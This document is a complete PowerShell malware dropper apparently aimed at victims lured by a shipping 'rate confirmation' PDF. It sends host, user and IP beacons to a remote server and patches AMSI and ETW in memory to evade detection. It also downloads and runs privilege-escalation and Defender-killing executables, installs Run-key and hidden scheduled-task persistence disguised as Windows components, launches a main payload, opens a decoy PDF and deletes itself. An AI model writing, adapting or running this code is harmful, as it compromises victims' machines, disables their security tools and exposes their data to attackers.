$ProgressPreference='SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}

$gh='https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers'
$srv='https://signindat.com'
$sources=@($srv,$gh)

$logPath="$env:TEMP\wmisrv.log"
function _log($m){ "$((Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) | $m" | Out-File $logPath -Append -Encoding utf8 }

$cbHost=$env:COMPUTERNAME
$cbUser=$env:USERNAME
$cbPid=$pid
$cbIsAdmin=$false
try{$cbIp=(Get-NetIPAddress -AddressFamily IPv4 | Where-Object{$_.InterfaceAlias -notmatch 'Loopback' -and $_.PrefixOrigin -ne 'WellKnown'}|Select-Object -First 1).IPAddress}catch{$cbIp='unknown'}
try{$cbOs=(Get-CimInstance Win32_OperatingSystem -ErrorAction Stop).Caption}catch{$cbOs='unknown'}

function _cb($stage,$status,$detail){
    try{
        $body=@{hostname=$cbHost;username=$cbUser;ip=$cbIp;os=$cbOs;is_admin=$cbIsAdmin;pid=$cbPid;stage=$stage;status=$status;detail=$detail;ts=(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')} | ConvertTo-Json -Compress
        $wc=New-Object Net.WebClient
        $wc.Headers.Add('Content-Type','application/json')
        $wc.UploadString("$srv/cb.php",'POST',$body)|Out-Null
    }catch{}
}

_log "S0: pid=$pid, u=$env:USERNAME, h=$cbHost"
_cb 'S0' 'ok' "pid=$pid, u=$env:USERNAME, h=$cbHost"

# AMSI+ETW patch
$k='ker';$kb='nel32.dll'
$Dm=[AppDomain]::CurrentDomain
$Da=New-Object System.Reflection.AssemblyName('W')
$Ab=$Dm.DefineDynamicAssembly($Da,[System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$Mb=$Ab.DefineDynamicModule('M',$false)
$Tb=$Mb.DefineType('W','Public,Class')
$Dll=[System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
$FldSL=[System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
$FldEP=[System.Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint')
$FldCS=[System.Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
$Flds=[System.Reflection.FieldInfo[]]@($FldSL,$FldEP,$FldCS)
$csUni=[System.Runtime.InteropServices.CharSet]::Unicode
$csAnsi=[System.Runtime.InteropServices.CharSet]::Ansi
$ka=@($k+$kb)
$u32ref=[UInt32].MakeByRefType()
$uptr6=New-Object UIntPtr(6)

$m0=$Tb.DefineMethod('LL','Public,Static',[IntPtr],@([String]))
$m0.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'LoadLibraryW',$csUni))))
$m1=$Tb.DefineMethod('GA','Public,Static',[IntPtr],@([IntPtr],[String]))
$m1.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'GetProcAddress',$csAnsi))))
$m2=$Tb.DefineMethod('VP','Public,Static',[bool],@([IntPtr],[UIntPtr],[UInt32],$u32ref))
$m2.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'VirtualProtect',$csAnsi))))
$W=$Tb.CreateType()

[byte[]]$p6=@(0xB8,0x00,0x00,0x00,0x00,0xC3)

try{
    $nd='ntd';$ndb='ll.dll'
    $nt=$W::LL($nd+$ndb)
    if($nt -ne [IntPtr]::Zero){
        $ew=$W::GA($nt,[char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101)
        if($ew -ne [IntPtr]::Zero){$o=[UInt32]0;$W::VP($ew,$uptr6,0x40,[ref]$o)|Out-Null;[Runtime.InteropServices.Marshal]::Copy($p6,0,$ew,6);$W::VP($ew,$uptr6,$o,[ref]$o)|Out-Null}
        $ewt=$W::GA($nt,[char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101+[char]84+[char]114+[char]97+[char]110+[char]115+[char]102+[char]101+[char]114)
        if($ewt -ne [IntPtr]::Zero){$o=[UInt32]0;$W::VP($ewt,$uptr6,0x40,[ref]$o)|Out-Null;[Runtime.InteropServices.Marshal]::Copy($p6,0,$ewt,6);$W::VP($ewt,$uptr6,$o,[ref]$o)|Out-Null}
    }
    $ad='ams';$adb='i.dll'
    $am=$W::LL($ad+$adb)
    if($am -ne [IntPtr]::Zero){
        $sb=$W::GA($am,[char]65+[char]109+[char]115+[char]105+[char]83+[char]99+[char]97+[char]110+[char]66+[char]117+[char]102+[char]102+[char]101+[char]114)
        if($sb -ne [IntPtr]::Zero){$o=[UInt32]0;$W::VP($sb,$uptr6,0x40,[ref]$o)|Out-Null;[Runtime.InteropServices.Marshal]::Copy($p6,0,$sb,6);$W::VP($sb,$uptr6,$o,[ref]$o)|Out-Null}
    }
    _log 'S0: p ok'
}catch{ _log 'S0: p err' }

# admin check
try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
_log "S1: a=$cbIsAdmin"
_cb 'S1' 'ok' "is_admin=$cbIsAdmin"

function _dl($n){
    foreach($src in $sources){
        try{
            $wc=New-Object Net.WebClient
            $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
            $d=$wc.DownloadData("$src/$n")
            _log "DL: $n $($d.Length)"
            return ,$d
        }catch{}
    }
    _log "DL: $n fail"
    return $null
}

function _run($n,$s,$l){
    $b=_dl $n
    if(-not $b){_cb $s 'fail' "$l dl";return $false}
    $p="$env:TEMP\$n"
    try{
        [IO.File]::WriteAllBytes($p,$b)
        Start-Process $p -WindowStyle Hidden
        _log "$s : $l ok"
        _cb $s 'ok' "$l ok"
        return $true
    }catch{
        _cb $s 'fail' "$l err"
        return $false
    }
}

function _runArg($n,$a,$s,$l){
    $b=_dl $n
    if(-not $b){_cb $s 'fail' "$l dl";return $false}
    $p="$env:TEMP\$n"
    try{
        [IO.File]::WriteAllBytes($p,$b)
        Start-Process $p -ArgumentList $a -WindowStyle Hidden
        _log "$s : $l ok ($a)"
        _cb $s 'ok' "$l ok"
        return $true
    }catch{
        _cb $s 'fail' "$l err"
        return $false
    }
}

# ELEVATION (if needed)
if(-not $cbIsAdmin){
    _run 'ElevatorShellCode.exe' 'S1' 'elev'
    Start-Sleep 6
    try{$cbIsAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
    _log "S1: a=$cbIsAdmin"
    if($cbIsAdmin){_cb 'S1' 'ok' 'elevation ok'}else{_cb 'S1' 'warn' 'elevation fail'}
}

# DEFENDER DISABLE — first priority
if($cbIsAdmin){
    try{
        $mp='Add-MpPreference'
        & $mp -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
        & $mp -ExclusionPath "$env:APPDATA" -ErrorAction SilentlyContinue
        & $mp -ExclusionProcess 'wmisrv.exe' -ErrorAction SilentlyContinue
    }catch{}

    try{
        $dp='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
        if(-not(Test-Path $dp)){New-Item -Path $dp -Force|Out-Null}
        Set-ItemProperty -Path $dp -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
        $rtp="$dp\Real-Time Protection"
        if(-not(Test-Path $rtp)){New-Item -Path $rtp -Force|Out-Null}
        Set-ItemProperty -Path $rtp -Name 'DisableRealtimeMonitoring' -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue
    }catch{}

    _runArg 'update.exe' 'kill' 'S2' 'defkill'
    Start-Sleep 3
    _cb 'S2' 'ok' 'defender killed'
}else{
    _cb 'S2' 'skip' 'no admin'
}

# PERSISTENCE
$persistCmd="cmd.exe /c bitsadmin /transfer ps1 /download /priority high $gh/updatemspuls.ps1 %TEMP%\\u.ps1 && powershell -w hidden -NoP -file %TEMP%\\u.ps1"
try{
    $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty -Path $rk -Name 'WindowsSecurityHealth' -Value $persistCmd -Force -ErrorAction SilentlyContinue
}catch{}

if($cbIsAdmin){
    try{
        $rk='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        Set-ItemProperty -Path $rk -Name 'WindowsUpdateOrchestrator' -Value $persistCmd -Force -ErrorAction SilentlyContinue
    }catch{}

    $taskName='WindowsHealthMonitor'
    schtasks /delete /tn $taskName /f 2>$null | Out-Null
    $xml=@"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<RegistrationInfo><Author>Microsoft</Author><Description>Windows Health Monitor Service</Description></RegistrationInfo>
<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger><BootTrigger><Enabled>true</Enabled></BootTrigger><CalendarTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary><Repetition><Interval>PT4H</Interval></Repetition><Enabled>true</Enabled></CalendarTrigger></Triggers>
<Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>
<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority></Settings>
<Actions Context="Author"><Exec><Command>powershell.exe</Command><Arguments>-w hidden -NoP -c "`$w=New-Object Net.WebClient;[IO.File]::WriteAllBytes(\"`$env:TEMP\\u.ps1\",`$w.DownloadData('$gh/updatemspuls.ps1'));powershell -w hidden -NoP -file `$env:TEMP\\u.ps1"</Arguments></Exec></Actions>
</Task>
"@
    $xmlPath="$env:TEMP\task.xml"
    [IO.File]::WriteAllText($xmlPath,$xml,[Text.Encoding]::Unicode)
    schtasks /create /tn $taskName /xml $xmlPath /f 2>&1 | Out-Null
    Remove-Item $xmlPath -Force -ErrorAction SilentlyContinue
}

_cb 'S3' 'ok' 'persist ok'

# MAIN PAYLOAD
_run 'PatchPulsaar.exe' 'S5' 'payload'

# DECOY PDF
$pdf='Rate_Confirmation_LD-2026-0847.pdf'
$pdfPath="$env:USERPROFILE\Downloads\$pdf"
$pdfBytes=_dl $pdf
if($pdfBytes){
    [IO.File]::WriteAllBytes($pdfPath,$pdfBytes)
    try{Start-Process $pdfPath;_cb 'S7' 'ok' 'pdf ok'}catch{_cb 'S7' 'warn' 'pdf open fail'}
}else{_cb 'S7' 'warn' 'pdf dl fail'}

# CLEANUP
Start-Sleep 5
Remove-Item "$env:TEMP\u.ps1" -Force -ErrorAction SilentlyContinue
$sp=$MyInvocation.MyCommand.Path
if($sp -and (Test-Path $sp)){
    Start-Process powershell.exe -ArgumentList "-NoP -w hidden -c `"Start-Sleep 3;Remove-Item -Path '$sp' -Force -ErrorAction SilentlyContinue`"" -WindowStyle Hidden
}

_log 'S9: done'
_cb 'S9' 'ok' 'done'
